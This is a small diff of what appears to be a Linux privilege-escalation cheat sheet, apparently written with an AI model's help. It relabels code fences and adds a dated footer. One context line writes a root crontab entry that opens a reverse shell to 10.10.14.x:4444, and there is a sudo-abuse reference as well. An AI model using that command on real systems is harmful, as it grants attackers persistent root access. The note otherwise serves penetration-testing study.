@@ -121,7 +121,7 @@ sudo -l
 
 **Output patterns and what they mean:**
 
-```
+```text
 (ALL : ALL) ALL               → full sudo — su to root with: sudo su
 (ALL) NOPASSWD: /usr/bin/vim  → run vim as root, no password
 (root) /usr/bin/python3       → run python3 as root
@@ -796,7 +796,7 @@ echo '* * * * * root bash -i >& /dev/tcp/10.10.14.x/4444 0>&1' >> /etc/crontab
 
 ## Quick Reference Checklist
 
-```
+```bash
 ENUMERATION
 [ ] id, whoami, sudo -l
 [ ] uname -a, cat /etc/os-release
@@ -856,3 +856,9 @@ KERNEL
 ```
 
 > See also: [[Windows Priv Esc]] for Windows-specific techniques
+
+---
+
+*Created: 2026-02-27*
+*Updated: 2026-05-13*
+*Model: claude-sonnet-4-6*
